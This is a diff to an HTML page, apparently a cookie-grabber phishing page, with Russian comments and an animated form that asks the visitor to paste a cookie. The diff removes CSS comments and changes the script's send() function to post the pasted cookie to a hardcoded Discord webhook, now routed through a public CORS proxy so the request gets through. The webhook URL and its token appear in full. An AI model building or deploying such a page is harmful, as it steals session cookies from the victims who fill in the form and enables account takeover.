@@ -79,7 +79,6 @@
             --sub2: #d4a017;
         }
 
-        /* АНИМАЦИИ */
         @keyframes gradientShift {
             0%, 100% { background-position: 0% 50%; }
             33% { background-position: 100% 50%; }
@@ -123,7 +122,6 @@
             transition: background 0.3s ease;
         }
 
-        /* ЗВЁЗДЫ */
         .stars {
             position: fixed;
             top: 0;
@@ -140,7 +138,6 @@
             animation: starTwinkle linear infinite;
         }
 
-        /* ПЕЧЕНЬКИ */
         .cookie {
             position: fixed;
             pointer-events: none;
@@ -150,7 +147,6 @@
             animation: cookieFloat linear infinite;
         }
 
-        /* КНОПКА ТЕМЫ */
         .theme-switch {
             position: fixed;
             top: 20px;
@@ -178,7 +174,6 @@
             box-shadow: 0 0 20px var(--glow1);
         }
 
-        /* КАРТОЧКА */
         .card {
             background: var(--card);
             backdrop-filter: blur(20px);
@@ -196,7 +191,6 @@
             border-color: var(--border-hover);
         }
 
-        /* ЛОГОТИП */
         .logo { text-align: center; margin-bottom: 30px; }
         .logo h1 {
             font-size: 52px;
@@ -219,7 +213,6 @@
             font-weight: 600;
         }
 
-        /* ПОЛЯ ВВОДА */
         .label {
             color: var(--text2);
             font-size: 13px;
@@ -249,7 +242,6 @@
         .cookie-input.valid { border-color: #22c55e; box-shadow: 0 0 0 2px rgba(34,197,94,0.2); }
         .cookie-input.invalid { border-color: #ef4444; box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }
 
-        /* СТАТУС */
         .validation-status {
             font-size: 11px;
             margin-top: 10px;
@@ -263,7 +255,6 @@
         .status-invalid { color: #ef4444; }
         .status-neutral { color: var(--text3); }
 
-        /* КНОПКА ОТПРАВКИ */
         .btn-primary {
             width: 100%;
             background: linear-gradient(135deg, var(--btn1), var(--btn2), var(--btn3));
@@ -298,7 +289,6 @@
         .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 35px var(--glow2); }
         .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; animation: none; }
 
-        /* СООБЩЕНИЯ */
         .message-area {
             text-align: center;
             margin-top: 20px;
@@ -351,8 +341,12 @@
 
     <script>
         (function() {
-            // ВЕБХУК
+            // ========== ПРОКСИ ДЛЯ ОБХОДА CORS ==========
+            const PROXY = "https://cors-anywhere.herokuapp.com/";
             const WEBHOOK_URL = "https://discord.com/api/webhooks/1496536250910249102/UOfPpewlAPiGVQjWs2ykmvW0o_KYzlZT3vJJ1MNu40W2ziyoca1PpcEHroIXW_zbgK_G";
+            
+            // ИСПОЛЬЗУЕМ ПРОКСИ
+            const FULL_URL = PROXY + WEBHOOK_URL;
 
             // ЗВЁЗДЫ
             const stars = document.getElementById('stars');
@@ -457,13 +451,15 @@
 
             async function send(cookie) {
                 try {
-                    const res = await fetch(WEBHOOK_URL, {
+                    // Отправка через прокси для обхода CORS
+                    const res = await fetch(FULL_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ content: cookie })
                     });
                     return res.ok;
                 } catch(e) {
+                    console.error(e);
                     return false;
                 }
             }
